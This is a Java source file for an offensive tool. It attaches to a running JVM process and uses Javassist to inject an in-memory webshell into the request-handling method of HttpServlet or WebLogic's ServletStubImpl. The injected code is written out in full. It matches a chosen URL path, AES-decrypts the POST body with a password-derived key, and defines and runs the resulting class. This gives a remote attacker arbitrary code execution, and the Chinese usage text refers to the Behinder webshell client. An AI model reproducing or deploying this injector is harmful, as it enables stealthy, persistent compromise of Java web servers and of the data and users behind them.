package jsx.ink;

import com.anbai.lingxe.loader.RASPVirtualMachineProxy;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import jsx.ink.utils.ServerDetector;

import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.security.MessageDigest;
import java.util.*;

public class AgentMain {

    //😄
    public static void agentmain(String args, Instrumentation inst) throws IOException {
        Class<?>[] cLasses = inst.getAllLoadedClasses();
        byte[] data = new byte[0];
        Map<String, Map<String, Object>> targetClasses = new HashMap();
        Map<String, Object> targetClassJavaxMap = new HashMap();
        targetClassJavaxMap.put("methodName", "service");
        List<String> paramJavaxClsStrList = new ArrayList();
        paramJavaxClsStrList.add("javax.servlet.ServletRequest");
        paramJavaxClsStrList.add("javax.servlet.ServletResponse");
        targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        Map<String, Object> targetClassJakartaMap = new HashMap();
        targetClassJakartaMap.put("methodName", "service");
        List<String> paramJakartaClsStrList = new ArrayList();
        paramJakartaClsStrList.add("jakarta.servlet.ServletRequest");
        paramJakartaClsStrList.add("jakarta.servlet.ServletResponse");
        targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        targetClasses.put("jakarta.servlet.http.HttpServlet", targetClassJakartaMap);
        String getCoreObject = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\n";
        ClassPool cPool = ClassPool.getDefault();
        if (ServerDetector.isWebLogic()) {
            targetClasses.clear();
            Map<String, Object> targetClassWeblogicMap = new HashMap();
            targetClassWeblogicMap.put("methodName", "execute");
            List<String> paramWeblogicClsStrList = new ArrayList();
            paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
            paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
            targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
            targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);
        }

        String shellCode = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\nString pathPattern=\"%s\";\nif (request.getRequestURI().matches(pathPattern))\n{\n\tjava.util.Map obj=new java.util.HashMap();\n\tobj.put(\"request\",request);\n\tobj.put(\"response\",response);\n\tobj.put(\"session\",session);\n    ClassLoader loader=this.getClass().getClassLoader();\n\tif (request.getMethod().equals(\"POST\"))\n\t{\n\t\ttry\n\t\t{\n\t\t\tString k=\"%s\";\n\t\t\tsession.putValue(\"u\",k);\n\t\t\t\n\t\t\tjava.lang.ClassLoader systemLoader=java.lang.ClassLoader.getSystemClassLoader();\n\t\t\tClass cipherCls=systemLoader.loadClass(\"javax.crypto.Cipher\");\n\n\t\t\tObject c=cipherCls.getDeclaredMethod(\"getInstance\",new Class[]{String.class}).invoke((java.lang.Object)cipherCls,new Object[]{\"AES\"});\n\t\t\tObject keyObj=systemLoader.loadClass(\"javax.crypto.spec.SecretKeySpec\").getDeclaredConstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]{k.getBytes(),\"AES\"});;\n\t\t\t       \n\t\t\tjava.lang.reflect.Method initMethod=cipherCls.getDeclaredMethod(\"init\",new Class[]{int.class,systemLoader.loadClass(\"java.security.Key\")});\n\t\t\tinitMethod.invoke(c,new Object[]{new Integer(2),keyObj});\n\n\t\t\tjava.lang.reflect.Method doFinalMethod=cipherCls.getDeclaredMethod(\"doFinal\",new Class[]{byte[].class});\n            byte[] requestBody=null;\n            try {\n                    Class Base64 = loader.loadClass(\"sun.misc.BASE64Decoder\");\n\t\t\t        Object Decoder = Base64.newInstance();\n                    requestBody=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                } catch (Exception ex) \n                {\n                    Class Base64 = loader.loadClass(\"java.util.Base64\");\n                    Object Decoder = Base64.getDeclaredMethod(\"getDecoder\",new Class[0]).invoke(null, new Object[0]);\n                    requestBody=(byte[])Decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                }\n\t\t\t\t\t\t\n\t\t\tbyte[] buf=(byte[])doFinalMethod.invoke(c,new Object[]{requestBody});\n\t\t\tjava.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n\t\t\tdefineMethod.setAccessible(true);\n\t\t\tjava.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n\t\t\tconstructor.setAccessible(true);\n\t\t\tjava.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n\t\t\tjava.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(buf),null});\n\t\t\tc.newInstance().equals(obj);\n\t\t}\n\n\t\tcatch(java.lang.Exception e)\n\t\t{\n\t\t   e.printStackTrace();\n\t\t}\n\t\tcatch(java.lang.Error error)\n\t\t{\n\t\terror.printStackTrace();\n\t\t}\n\t\treturn;\n\t}\t\n}\n";

        Class[] var28 = cLasses;
        int var13 = cLasses.length;

        for (int var14 = 0; var14 < var13; ++var14) {
            Class<?> cls = var28[var14];
            if (targetClasses.keySet().contains(cls.getName())) {
                String targetClassName = cls.getName();

                try {
                    String path = new String(base64decode(args.split("\\|")[0]));
                    String key = new String(base64decode(args.split("\\|")[1]));
                    shellCode = String.format(shellCode, path, key);
                    if (targetClassName.equals("jakarta.servlet.http.HttpServlet")) {
                        shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
                    }

                    ClassClassPath classPath = new ClassClassPath(cls);
                    cPool.insertClassPath(classPath);
                    cPool.importPackage("java.lang.reflect.Method");
                    cPool.importPackage("javax.crypto.Cipher");
                    List<CtClass> paramClsList = new ArrayList();
                    Iterator var21 = ((List) ((Map) targetClasses.get(targetClassName)).get("paramList")).iterator();

                    String methodName;
                    while (var21.hasNext()) {
                        methodName = (String) var21.next();
                        paramClsList.add(cPool.get(methodName));
                    }

                    CtClass cClass = cPool.get(targetClassName);
                    methodName = ((Map) targetClasses.get(targetClassName)).get("methodName").toString();
                    CtMethod cMethod = cClass.getDeclaredMethod(methodName, (CtClass[]) paramClsList.toArray(new CtClass[paramClsList.size()]));
                    cMethod.insertBefore(shellCode);
                    cClass.detach();
                    data = cClass.toBytecode();
                    inst.redefineClasses(new ClassDefinition[]{new ClassDefinition(cls, data)});
                } catch (Exception var24) {
                    var24.printStackTrace();
                } catch (Error var25) {
                    var25.printStackTrace();
                }
            }
        }

    }


    public static void main(String args[]) throws Exception {

        if (args.length != 2) {
            System.err.println("usage:java -jar loadAgent.jar {/path,不支持通配符} {明文密码，填到冰蝎输入框那个}");
            System.err.println("例如： loadAgent.jar /1234 rebeyond");

            System.exit(-1);
        }

        String path = args[0];
        String pass = string2MD5(args[1]).substring(0,16);


        RASPVirtualMachineProxy raspVirtualMachineProxy = new RASPVirtualMachineProxy();
        Map<String, String> stringStringMap = raspVirtualMachineProxy.listJVMPID();
        String currengJarPath = getJarPath();
        Scanner scanner = null;
        try {
            System.err.println("\n输入进程PID，选择要加载agent的进程！\n");

            Set<String> strings = stringStringMap.keySet();
            Iterator<String> iterator = strings.iterator();
            String pid = "";
            System.err.println("id\t\t\tdisplayName\n");
            while (iterator.hasNext()) {
                pid = iterator.next();
                String s = stringStringMap.get(pid);
                System.err.println(pid + "\t\t" + s + "\n");
            }

            System.err.println("\n输入进程PID:\n");
            scanner = new Scanner(System.in);
            pid = scanner.next();

            System.err.println("选择进程PID为：" + pid + ",开始加载agent！");
            Object attach = raspVirtualMachineProxy.attach(pid);
            raspVirtualMachineProxy.loadAgent(attach, currengJarPath, base64encode(path) + "|" + base64encode(pass));
            System.err.println("进程注入完成，输入任意内容结束");
            new Scanner(System.in).next();

        } catch (Exception e) {
            System.err.println(e.getMessage());
            System.exit(-1);
        }
    }

    public static String getJarPath() {
        String path = AgentMain.class.getProtectionDomain().getCodeSource().toString();
        path = path.replaceAll("file:", "");
        path = path.replaceAll(" <no signer certificates>\\)", "");
        path = path.replaceAll("\\(", "");
        return path;
    }

    private static byte[] base64decode(String base64Text) throws Exception {
        String version = System.getProperty("java.version");
        byte[] result;
        Class Base64;
        Object Decoder;
        if (version.compareTo("1.9") >= 0) {
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[]) null).invoke(Base64, (Object[]) null);
            result = (byte[]) ((byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
        } else {
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[]) ((byte[]) Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
        }

        return result;
    }

    private static String base64encode(String content) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        Class Base64;
        Object Encoder;
        if (version.compareTo("1.9") >= 0) {
            Base64 = Class.forName("java.util.Base64");
            Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
        } else {
            Base64 = Class.forName("sun.misc.BASE64Encoder");
            Encoder = Base64.newInstance();
            result = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
            result = result.replace("\n", "").replace("\r", "");
        }

        return result;
    }

        public static String string2MD5(String inStr) {
            MessageDigest md5 = null;
            try {
                md5 = MessageDigest.getInstance("MD5");
            } catch (Exception e) {
                e.printStackTrace();
                return "";
            }
            char[] charArray = inStr.toCharArray();
            byte[] byteArray = new byte[charArray.length];

            for (int i = 0; i < charArray.length; i++)
                byteArray[i] = (byte) charArray[i];
            byte[] md5Bytes = md5.digest(byteArray);
            StringBuffer hexValue = new StringBuffer();
            for (int i = 0; i < md5Bytes.length; i++) {
                int val = ((int) md5Bytes[i]) & 0xff;
                if (val < 16)
                    hexValue.append("0");
                hexValue.append(Integer.toHexString(val));
            }
            return hexValue.toString();
        }
}
